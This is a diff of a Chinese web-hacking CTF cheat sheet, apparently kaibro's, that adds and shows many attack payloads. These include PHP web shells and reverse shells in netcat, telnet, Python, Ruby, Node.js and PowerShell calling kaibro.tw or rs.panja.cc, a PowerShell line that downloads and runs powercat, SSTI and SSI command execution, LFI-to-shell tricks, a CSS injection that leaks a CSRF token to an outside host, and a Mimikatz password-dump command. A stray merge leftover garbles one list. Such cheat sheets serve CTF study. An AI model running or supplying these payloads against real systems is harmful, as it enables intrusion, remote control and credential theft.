@@ -61,6 +61,7 @@ Table of Contents
 <?php system($_GET[1]); ?>
 <?php system("`$_GET[1]`"); ?>
 <?= system($_GET[cmd]);
+<?=`$_GET[1]`;
 <?php eval($_POST[cmd]);?>
 <?php echo `$_GET[1]`;
 <?php echo passthru($_GET['cmd']);
@@ -261,12 +262,21 @@ A=fl;B=ag;cat $A$B
 - NC
     - `nc -e /bin/sh rs.panja.cc 1234`
 
+- Telnet
+    - `mknod backpipe p && telnet kaibro.tw 5566 0<backpipe | /bin/bash 1>backpipe`
+
 - Python
     - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("rs.panja.cc",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+- Ruby 
+    - `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("kaibro.tw","5566");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
 
 - Node.js
     - `var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(1234, "rs.panja.cc", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});`
     - `require('child_process').exec("bash -c 'bash -i >& /dev/tcp/rs.panja.cc/1234 0>&1'");`
+
+- Powershell
+    - `powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c kaibro.tw -p 5566 -e cmd`
 
 # PHP Tag
 
@@ -596,6 +606,17 @@ Request: `http://rs.panja.cc/test.php?url=%67%67`
 - https://github.com/GoSecure/php7-opcache-override
     - Disassembler可以把Byte code转成Pseudo code
 
+## PCRE回溯次數限制繞過
+
+- PHP的PCRE庫使用NFA作為正規表達式引擎
+    - NFA在匹配不上時，會回溯嘗試其他狀態
+- PHP為防止DOS，設定了PCRE回溯次數上限
+    - `pcre.backtrack_limit`
+    - 預設為`1000000`
+- 回溯次數超過上限時，`preg_match()`會返回`false`
+- Example
+    - Code-Breaking Puzzles - pcrewaf
+
 
 ## 其他
 
@@ -605,8 +626,13 @@ Request: `http://rs.panja.cc/test.php?url=%67%67`
     - `b`
 - ```echo `whoami`; ```
     - `kaibro`
-- 正规表达式`.`不匹配换行字元`%0a`
+- 正则表达式`.`不匹配换行字元`%0a`
 - 运算优先权问题
+- 正则表达式常见错误:
+    - `preg_match("/\\/", $str)`
+    - 匹配反斜杠应该要用`\\\\`而不是`\\`
+- 运算优先级问题
+        upstream/master
     - `$a = true && false;`
         - `$a` => `false`
     - `$a = true and false;`
@@ -644,9 +670,12 @@ Request: `http://rs.panja.cc/test.php?url=%67%67`
         - True
 
 - json_decode
-    - 不直接吃掉换行字元和\t字元
-    - 但可以吃掉'\n'和'\t'
-        - 会转成换行字元和Tab
+    - 不直接吃换行字符和\t字符
+    - 但可以吃'\n'和'\t'
+        - 会转成换行字符和Tab
+    - 也吃`\uxxxx`形式
+        - `json_decode('{"a":"\u0041"}')`
+
 
 - === bug
     - `var_dump([0 => 0] === [0x100000000 => 0])`
@@ -656,7 +685,9 @@ Request: `http://rs.panja.cc/test.php?url=%67%67`
 - openssl_verify
     - 预测採用SHA1来做签名，可能有SHA1 Collision问题
     - DEFCON CTF 2018 Qual
-
+- Namespace
+    - PHP的預設Global space是`\`
+    - e.g. `\system('ls');`
 
 # Command Injection
 
@@ -1313,6 +1344,7 @@ end
     - `pg_ls_dir(dirname)`
         - 列目录内容
         - 只能列data_directory下的
+    - PHP的`pg_query()`可以多語句執行
 
 ## ORM injection
 
@@ -1398,6 +1430,7 @@ HQL injection example (pwn2win 2017)
 - `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
 - `/var/log/apache2/error.log`
 - `/var/log/httpd/access_log`
+- `/var/log/mail.log`
 - `/usr/local/apache2/conf/httpd.conf`
 - `/etc/apache2/apache2.conf`
 - `/etc/apache2/sites-available/000-default.conf`
@@ -1428,6 +1461,7 @@ HQL injection example (pwn2win 2017)
 
 - apache log
 - mysql log
+- mail log
 - ssh log
     - `/var/log/auth.log`
 
@@ -1445,9 +1479,11 @@ HQL injection example (pwn2win 2017)
 
 ## phpinfo
 
-- 对server以form-data上传文件，会产生tmp档
-- 利用phpinfo得到tmp档路径和名称
-- Get shell
+- 对server以form-data上传文件，会产生tmp文件
+- 利用phpinfo得到tmp文件路径和名称
+- LFI Get shell
+- 限制
+    - Ubuntu 17后，默认开启`PrivateTmp`，无法利用
 
 ## php session
 
@@ -1458,6 +1494,14 @@ HQL injection example (pwn2win 2017)
     - /tmp/
     - /var/lib/php5/
     - /var/lib/php/
+- `session.upload_progress`
+    - PHP預設開啟
+    - 用來監控上傳檔案進度
+    - 當`session.upload_progress.enabled`開啟，可以POST在`$_SESSION`中添加資料 (`sess_{PHPSESSID}`)
+    - 配合LFI可以getshell
+    - `session.upload_progress.cleanup=on`時，可以透過Race condition
+    - Example
+        - HITCON CTF 2018 - One Line PHP Challenge
 
 ## data://
 
@@ -1484,6 +1528,16 @@ HQL injection example (pwn2win 2017)
         ?>
     - 构造 `?file=phar://phartest.zip/b.jpg`
 
+## SSI (Server Side Includes)
+
+- 通常放在`.shtml`, `.shtm`
+- Execute Command
+    - `<!--#exec cmd="command"-->`
+- File Include
+    - `<!--#include file="../../web.config"-->`
+- Example
+    - HITCON CTF 2018 - Why so Serials?
+
 # 上传漏洞
 
 ## Javascript检测
@@ -1495,7 +1549,7 @@ HQL injection example (pwn2win 2017)
 
 - Burp修改Content-Type
 
-## 黑名单判断副档名
+## 黑名单判断后缀名
 
 - 大小写绕过
     - pHP
@@ -1639,6 +1693,17 @@ HQL injection example (pwn2win 2017)
     - `O:4:"test":1:{s:1:"a";s:3:"aaa";}`
     - 两者结果相同
 
+- Phar:// 反序列化
+    - phar文件會將使用者自定義的metadata以序列化形式保存
+    - 透過`phar://`偽協議可以達到反序列化的效果
+    - 常見影響函數: `file_get_contents()`, `file_exists()`, `is_dir()`, ...
+    - Generic Gadget Chains
+        - [phpggc](https://github.com/ambionics/phpggc)
+    - Example
+        - HITCON CTF 2017 - Baby^H Master PHP 2017
+        - HITCON CTF 2018 - Baby Cake
+        - DCTF 2018 - Vulture
+
 ## Python Pickle
 
 - `dumps()` 将物件序列化成字符串
@@ -1741,6 +1806,13 @@ print marshalled
 
 - https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
 
+## .NET Derserialization
+
+- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
+- asp.net中ViewState以序列化形式保存資料
+    - 有machinekey或viewstate未加密/驗證時，可以RCE
+- Example
+    - HITCON CTF 2018 - Why so Serials?
 
 # SSTI 
 
@@ -1775,7 +1847,7 @@ Server-Side Template Injection
     - `{{ config['RUNCMD']('cat flag',shell=True) }}`
 
 - RCE (another way)
-        - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
+    - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
 - 过滤中括号
     - `__getitem__`
     - `{{''.__class__.__mro__.__getitem__(2)}}`
@@ -2303,6 +2375,16 @@ https://csp-evaluator.withgoogle.com/
                 - CSS会载入`/1/?query={}*{background-color:red}/../../1/`
             - CSS语法容错率很高
 
+## CSS Injection
+
+- CSS可控時，可以Leak Information
+- Example:
+    - leak `<input type='hidden' name='csrf' value='2e3d04bf...'>`
+    - `input[name=csrf][value^="2"]{background: url(http://kaibro.tw/2)}`
+    - `input[name=csrf][value^="2e"]{background: url(http://kaibro.tw/2e)}`
+    - ...
+    - SECCON CTF 2018 - GhostKingdom
+
 # 密码学
 
 ## PRNG
@@ -2424,11 +2506,14 @@ state[i] = state[i-3] + state[i-31]`
      - server-status
      - crossdomain.xml
      - admin/ manager/ login/ backup/ wp-login/ phpMyAdmin/
-     - xxx.php.bak / www.tar.gz / xxx.php.swp / xxx.php~ / xxx.phps
+     - xxx.php.bak / www.tar.gz / .xxx.php.swp / xxx.php~ / xxx.phps
      - /WEB-INF/web.xml
  - 文件解析漏洞
      - Apache
          - shell.php.ggininder
+         - shell.php%0a
+            - httpd 2.4.0 to 2.4.29
+            - CVE-2017-15715
      - IIS
          - IIS < 7
              - a.asp/user.jpg
@@ -2511,6 +2596,16 @@ state[i] = state[i-3] + state[i-31]`
 - Apache Tomcat Session操纵漏洞
     - 预设session范例页面`/examples/servlets /servlet/SessionExample`
     - 可以直接对Session写入
+
+- polyglot image+.htaccess
+    - XBM格式有定義在`exif_imagetype()`中
+    - 符合`.htaccess`格式
+    - Insomnihack CTF
+    ```
+    #define gg_width 1337
+    #define gg_height 1337
+    AddType application/x-httpd-php .asp
+    ```
 
 - tcpdump
     - `-i` 指定网卡，不指定则监控所有网卡
@@ -2632,5 +2727,22 @@ state[i] = state[i-3] + state[i-31]`
 - https://r12a.github.io/apps/encodings/
     - Encoding converter 
 
+- http://tool.leavesongs.com/
+
 - Mimikatz
     - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
+
+- WASM
+    - https://wasdk.github.io/WasmFiddle/
+
+----
+
+# Contributing
+
+Welcome to open Pull Request
+
+OR
+
+[![Buy me a coffee](https://www.buymeacoffee.com/assets/img/custom_images/black_img.png)](https://www.buymeacoffee.com/b4wKcIZ)
+
+
